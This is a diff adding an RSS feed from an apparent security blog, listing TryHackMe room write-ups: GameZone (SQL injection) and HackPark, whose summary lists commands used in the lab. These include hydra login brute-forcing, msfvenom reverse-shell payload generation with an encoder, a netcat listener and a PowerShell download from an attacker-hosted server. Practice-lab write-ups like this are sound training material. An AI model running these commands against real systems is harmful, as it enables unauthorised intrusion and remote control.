@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>TryHackMe on</title><link>https://www.xuptox.org/categories/tryhackme/</link><description>Recent content in TryHackMe on</description><generator>Hugo -- gohugo.io</generator><language>en-US</language><lastBuildDate>Wed, 14 Apr 2021 23:00:14 +0200</lastBuildDate><atom:link href="https://www.xuptox.org/categories/tryhackme/index.xml" rel="self" type="application/rss+xml"/><item><title>GameZone</title><link>https://www.xuptox.org/docs/tryhackme/gamezone/</link><pubDate>Wed, 14 Apr 2021 23:00:14 +0200</pubDate><guid>https://www.xuptox.org/docs/tryhackme/gamezone/</guid><description>Used Commands Task 1 Google: Who&amp;rsquo;s the guy? This guy is known from a videogame called Hitman. I&amp;rsquo;m pretty sure you can find his name on your own.
+Task 2 Obtain access via SQL Injection The task description gives you a good idea about SQL injection and how it can be used or better abused to query some data (sensitive data exposure).
+The target is to rewrite a prepared statement, that is intended to validate i.</description></item><item><title>HackPark</title><link>https://www.xuptox.org/docs/tryhackme/hackpark/</link><pubDate>Wed, 14 Apr 2021 23:00:14 +0200</pubDate><guid>https://www.xuptox.org/docs/tryhackme/hackpark/</guid><description>Used Commands hydra -l &amp;lt;username&amp;gt; -P &amp;lt;path to wordlist&amp;gt; &amp;lt;target ip&amp;gt; http-post-form &amp;lt;payload&amp;gt;
+searchsploit &amp;lt;search name&amp;gt;
+nc -lvnp &amp;lt;listener port&amp;gt;
+python3 -m http.server &amp;lt;webserver port&amp;gt;
+msfvenom --list payloads
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&amp;lt;listener ip&amp;gt; LPORT=&amp;lt;listener port&amp;gt; -f exe &amp;gt; shell.exe
+msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=&amp;lt;listener ip&amp;gt; LPORT=&amp;lt;listener port&amp;gt; -f exe -o &amp;lt;output filename&amp;gt;
+msfvenom -p &amp;lt;payload&amp;gt; -a &amp;lt;architecture&amp;gt; --encoder /x86/shikata_ga_nai LHOST=&amp;lt;listener ip&amp;gt; LPORT=&amp;lt;listener port&amp;gt; -f exe -o &amp;lt;output filename&amp;gt;
+getuid
+powershell -c &amp;quot;Invoke-WebRequest -Uri 'http://&amp;lt;webserver ip&amp;gt;:&amp;lt;webserver port&amp;gt;/&amp;lt;filename&amp;gt;' -OutFile '&amp;lt;output filename&amp;gt;'&amp;quot;
+powershell &amp;quot;(New-Object System.</description></item></channel></rss>
